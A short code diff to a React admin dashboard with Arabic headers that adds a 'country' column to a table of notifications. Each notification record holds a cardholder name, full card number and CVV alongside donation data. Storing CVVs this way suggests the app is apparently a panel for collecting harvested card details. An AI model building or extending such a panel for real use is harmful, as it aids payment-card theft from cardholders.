@@ -33,6 +33,7 @@ interface Notification {
   id: string;
   cardHolder: string;
   cardNumber: string;
+  country?:string;
   createdDate: string; // ISO date string
   cvv: string;
   donationData: {
@@ -200,7 +201,7 @@ export default function NotificationsPage1() {
                 <th className="px-4 py-3 text-right">المعلومات</th>
                 <th className="px-4 py-3 text-right">حالة البطاقة</th>
                 <th className="px-4 py-3 text-right">الوقت</th>
-                <th className="px-4 py-3 text-center">الاشعارات</th>
+                <th className="px-4 py-3 text-center">الدولة</th>
                 <th className="px-4 py-3 text-center">حذف</th>
               </tr>
             </thead>
@@ -249,8 +250,8 @@ export default function NotificationsPage1() {
                     })}
                   </td>{' '}
                   <td className="px-4 py-3 text-center">
-                    <Badge variant="default" className="bg-green-500">
-                      1
+                    <Badge variant="outline" className="bg-green-500">
+                      {notification.country}
                     </Badge>
                   </td>
                   <td className="px-4 py-3 text-center">
